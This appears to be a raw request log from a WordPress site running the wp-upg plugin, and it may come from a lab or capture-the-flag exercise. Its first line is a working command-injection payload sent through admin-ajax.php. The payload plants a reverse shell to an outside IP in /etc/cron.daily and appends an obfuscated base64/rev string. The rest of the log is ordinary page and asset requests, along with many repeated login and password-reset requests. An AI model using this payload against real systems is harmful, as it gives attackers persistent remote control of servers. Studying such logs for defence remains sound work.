/wordpress/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo%20%22sh%20-i%20%3E&%20/dev/tcp/82.179.92.206/7331%200%3E&1%22%20%3E%20/etc/cron.daily/testconnect%20&&%20Nz=Eg1n;az=5bDRuQ;Mz=fXIzTm;Kz=F9nMEx;Oz=7QlRI;Tz=4xZ0Vi;Vz=XzRfdDV;echo%20$Mz$Tz$Vz$az$Kz$Oz|base64%20-d|rev:NULL:NULL
/wordpress/index.php/post-video-url/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-video-url/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/my-gallery/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-image/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/users-photo-gallery/
/wordpress/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.3.1
/wordpress/wp-includes/css/media-views.min.css?ver=6.3.1
/wordpress/wp-includes/js/imgareaselect/imgareaselect.css?ver=0.9.8
/wordpress/wp-includes/css/dashicons.min.css?ver=6.3.1
/wordpress/wp-includes/css/buttons.min.css?ver=6.3.1
/wordpress/wp-includes/js/utils.min.js?ver=6.3.1
/wordpress/wp-includes/js/plupload/plupload.min.js?ver=2.1.9
/wordpress/wp-includes/js/plupload/moxie.min.js?ver=1.3.5
/wordpress/wp-includes/js/underscore.min.js?ver=1.13.4
/wordpress/wp-includes/js/shortcode.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-models.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-util.min.js?ver=6.3.1
/wordpress/wp-includes/js/plupload/wp-plupload.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2
/wordpress/wp-includes/js/wp-backbone.min.js?ver=6.3.1
/wordpress/wp-includes/js/backbone.min.js?ver=1.4.1
/wordpress/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.2
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.2
/wordpress/wp-content/uploads/2023/09/hash-password-anoynymous-833x554-1.jpg
/wordpress/wp-includes/js/api-request.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2
/wordpress/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.11
/wordpress/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.17
/wordpress/wp-includes/js/dist/dom-ready.min.js?ver=392bdd43726760d1f3ca
/wordpress/wp-includes/js/clipboard.min.js?ver=2.0.11
/wordpress/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1
/wordpress/wp-includes/js/dist/a11y.min.js?ver=7032343a947cfccf5608
/wordpress/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0
/wordpress/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef
/wordpress/wp-includes/js/media-editor.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-audiovideo.min.js?ver=6.3.1
/wordpress/wp-content/uploads/2023/09/black.png
/wordpress/wp-content/plugins/wp-upg/images/noimg.png
/wordpress/wp-includes/js/media-views.min.js?ver=6.3.1
/wordpress/wp-content/uploads/2023/09/6f26ddd1bf59740c536d2274bb834a05.png
/wordpress/wp-admin/admin-ajax.php
*
/wordpress/wp-admin/profile.php
/wordpress/wp-admin/js/password-strength-meter.min.js?ver=6.3.1
/wordpress/wp-admin/js/user-profile.min.js?ver=6.3.1
/wordpress/wp-includes/js/zxcvbn.min.js
/wordpress/wp-admin/profile.php
/wordpress/wp-admin/index.php
/wordpress/wp-admin/about.php
/wordpress/wp-admin/images/about-release-badge.svg?ver=6.3
/wordpress/wp-admin/images/about-header-about.svg?ver=6.3
/wordpress/wp-admin/profile.php
/wordpress/wp-admin/profile.php
/wordpress/wp-admin/profile.php
/wordpress/wp-admin/profile.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-image/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-video-url/
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/post-image/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/blog/
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/wp-includes/blocks/navigation/style.min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/style.css?ver=2.18
/wordpress/wp-content/plugins/wp-upg/css/grids-responsive-min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/pure-min.css?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/css/jquery.fancybox.min.css?ver=2.18
/wordpress/wp-includes/blocks/navigation/view.min.js?ver=886680af40b7521d60fc
/wordpress/wp-includes/blocks/navigation/view-modal.min.js?ver=b478fa3cd1475dec97d3
/wordpress/wp-includes/js/jquery/jquery.min.js?ver=3.7.0
/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1
/wordpress/wp-content/plugins/wp-upg/js/filter-tags.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/common.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/jquery.tagsinput.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/jquery.fancybox.min.js
/wordpress/wp-content/plugins/wp-upg/js/jquery.zoom.js?ver=6.3.1
/wordpress/wp-content/plugins/wp-upg/js/upg_oembed.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_load_more.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_ajax_post.js?ver=2.18
/wordpress/wp-content/plugins/wp-upg/js/upg_delete.js?ver=2.18
/wordpress/index.php/comments/feed/
/wordpress/index.php/feed/
/wordpress/wp-includes/js/wp-emoji-release.min.js?ver=6.3.1
/wordpress/wp-admin/admin-ajax.php
*
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/post-video-url/
/wordpress/index.php/users-photo-gallery/
/wordpress/wp-includes/css/buttons.min.css?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.17
/wordpress/wp-includes/css/dashicons.min.css?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=6.3.1
/wordpress/wp-includes/js/imgareaselect/imgareaselect.css?ver=0.9.8
/wordpress/wp-includes/css/media-views.min.css?ver=6.3.1
/wordpress/wp-includes/js/utils.min.js?ver=6.3.1
/wordpress/wp-includes/js/plupload/plupload.min.js?ver=2.1.9
/wordpress/wp-includes/js/plupload/moxie.min.js?ver=1.3.5
/wordpress/wp-includes/js/underscore.min.js?ver=1.13.4
/wordpress/wp-includes/js/backbone.min.js?ver=1.4.1
/wordpress/wp-includes/js/media-models.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-backbone.min.js?ver=6.3.1
/wordpress/wp-includes/js/plupload/wp-plupload.min.js?ver=6.3.1
/wordpress/wp-includes/js/shortcode.min.js?ver=6.3.1
/wordpress/wp-includes/js/wp-util.min.js?ver=6.3.1
/wordpress/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/mouse.min.js?ver=1.13.2
/wordpress/wp-includes/js/jquery/ui/sortable.min.js?ver=1.13.2
/wordpress/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=6.3.1
/wordpress/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.17
/wordpress/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=6.3.1
/wordpress/wp-includes/js/api-request.min.js?ver=6.3.1
/wordpress/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2
/wordpress/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.11
/wordpress/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0
/wordpress/wp-includes/js/dist/dom-ready.min.js?ver=392bdd43726760d1f3ca
/wordpress/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1
/wordpress/wp-includes/js/dist/i18n.min.js?ver=7701b0c3857f914212ef
/wordpress/wp-includes/js/dist/a11y.min.js?ver=7032343a947cfccf5608
/wordpress/wp-includes/js/clipboard.min.js?ver=2.0.11
/wordpress/wp-includes/js/media-editor.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-views.min.js?ver=6.3.1
/wordpress/wp-includes/js/media-audiovideo.min.js?ver=6.3.1
/wordpress/wp-content/uploads/2023/09/black.png
/wordpress/wp-content/uploads/2023/09/hash-password-anoynymous-833x554-1.jpg
/wordpress/wp-content/plugins/wp-upg/images/noimg.png
/wordpress/wp-content/uploads/2023/09/6f26ddd1bf59740c536d2274bb834a05.png
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/comments/feed/
/wordpress/index.php/feed/
*
/wordpress/index.php/post-image/
/wordpress/index.php/comments/feed/
/wordpress/index.php/feed/
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/wp-admin/admin-ajax.php
/wordpress/
/wordpress/index.php/feed/
/wordpress/index.php/comments/feed/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/blog/
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-login.php?redirect_to=http%3A%2F%2Fjohnathan.dev%2Fwordpress%2Fwp-admin%2F&reauth=1
/wordpress/wp-admin/css/forms.min.css?ver=6.3.1
/wordpress/wp-admin/css/l10n.min.css?ver=6.3.1
/wordpress/wp-admin/js/password-strength-meter.min.js?ver=6.3.1
/wordpress/wp-includes/js/zxcvbn-async.min.js?ver=1.0
/wordpress/wp-admin/js/user-profile.min.js?ver=6.3.1
/wordpress/wp-admin/css/login.min.css?ver=6.3.1
/wordpress/wp-admin/images/wordpress-logo.svg?ver=20131107
/wordpress/wp-includes/js/zxcvbn.min.js
/wordpress/wp-admin/admin-ajax.php
*
/wordpress/wp-login.php?redirect_to=http%3A%2F%2Fjohnathan.dev%2Fwordpress%2Fwp-admin%2F&reauth=1
/wordpress/wp-login.php
*
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-admin/profile.php
/wordpress/wp-login.php
/wordpress/wp-includes/css/dashicons.min.css?ver=6.3.1
/wordpress/wp-includes/css/buttons.min.css?ver=6.3.1
/wordpress/wp-admin/css/forms.min.css?ver=6.3.1
/wordpress/wp-admin/css/l10n.min.css?ver=6.3.1
/wordpress/wp-admin/css/login.min.css?ver=6.3.1
/wordpress/wp-includes/js/zxcvbn-async.min.js?ver=1.0
/wordpress/wp-includes/js/jquery/jquery.min.js?ver=3.7.0
/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1
/wordpress/wp-includes/js/dist/vendor/wp-polyfill-inert.min.js?ver=3.1.2
/wordpress/wp-includes/js/dist/vendor/regenerator-runtime.min.js?ver=0.13.11
/wordpress/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=3.15.0
/wordpress/wp-includes/js/dist/hooks.min.js?ver=c6aec9a8d4e5a5d543a1
/wordpress/wp-admin/images/wordpress-logo.svg?ver=20131107
/wordpress/wp-admin/
/wordpress/index.php/my-gallery/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/edit-upg-post/
/wordpress/wp-admin/admin-ajax.php
/wordpress/index.php/blog/
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-login.php
/wordpress/wp-admin/css/l10n.min.css?ver=6.3.1
/wordpress/wp-admin/css/login.min.css?ver=6.3.1
/wordpress/wp-includes/js/zxcvbn-async.min.js?ver=1.0
/wordpress/wp-admin/js/password-strength-meter.min.js?ver=6.3.1
/wordpress/wp-admin/css/forms.min.css?ver=6.3.1
/wordpress/wp-admin/js/user-profile.min.js?ver=6.3.1
/wordpress/wp-admin/images/wordpress-logo.svg?ver=20131107
/wordpress/wp-includes/js/zxcvbn.min.js
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-admin/admin-ajax.php
/wordpress/wp-login.php
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php?action=lostpassword
/wordpress/wp-login.php
/wordpress/wp-login.php?action=lostpassword
/wordpress/
/wordpress/wp-admin/admin-ajax.php
*
